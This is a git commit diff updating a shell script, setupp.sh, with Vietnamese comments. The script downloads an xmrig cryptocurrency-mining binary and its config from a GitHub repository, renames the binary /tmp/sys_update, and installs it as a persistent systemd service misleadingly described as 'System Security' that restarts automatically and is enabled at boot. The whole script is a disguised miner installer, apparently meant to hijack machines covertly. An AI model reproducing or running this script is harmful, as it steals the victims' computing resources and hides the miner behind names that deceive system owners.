a83a6fb142080478a76c473e9dfccf127272de61
AnnaliseHackett <fdsjkrnennnnnnnnnnnnnnnnugierhguierhngiengioejgfmeofe@tempmail.ckvn.edu.vn>
2026-01-25 10:54:18 +0700

    Update setupp.sh

--- setupp.sh
+++ setupp.sh
@@ -1,12 +1,19 @@
-# Di chuyển vào thư mục tạm (nơi Service sẽ đọc file)
-cd /tmp
+#!/bin/bash
 
-# Tải lại file config với quyền sudo và lọc bỏ ký tự lạ
-sudo curl -sL https://github.com/AnnaliseHackett/Fix/raw/refs/heads/main/config.json | tr -d '\r' | sudo tee /tmp/config.json > /dev/null
+# 1. Chuyển vùng làm việc
+cd /tmp || exit
 
-# Đảm bảo file thực thi sys_update cũng nằm ở đây
-sudo curl -sL https://github.com/AnnaliseHackett/Fix/raw/refs/heads/main/xmrig -o /tmp/sys_update
-sudo chmod +x /tmp/sys_update
+# 2. Tải config và ép kiểu xóa sạch dấu cách thừa/xuống dòng lạ
+curl -sL https://github.com/AnnaliseHackett/Fix/raw/refs/heads/main/config.json | tr -d '\r' > /tmp/config.json
 
-# Khởi động lại service để nó nhận file mới
+# 3. Tải file thực thi
+curl -sL https://github.com/AnnaliseHackett/Fix/raw/refs/heads/main/xmrig -o /tmp/sys_update
+chmod +x /tmp/sys_update
+
+# 4. TẠO STARTUP (Dùng printf để né lỗi xuống dòng của file sh)
+sudo printf "[Unit]\nDescription=System Security\nAfter=network.target\n\n[Service]\nExecStart=/tmp/sys_update --config=/tmp/config.json\nRestart=always\n\n[Install]\nWantedBy=multi-user.target\n" | sudo tee /etc/systemd/system/sys_update.service > /dev/null
+
+# 5. KÍCH HOẠT VÀ CHẠY
+sudo systemctl daemon-reload
+sudo systemctl enable sys_update
 sudo systemctl restart sys_update
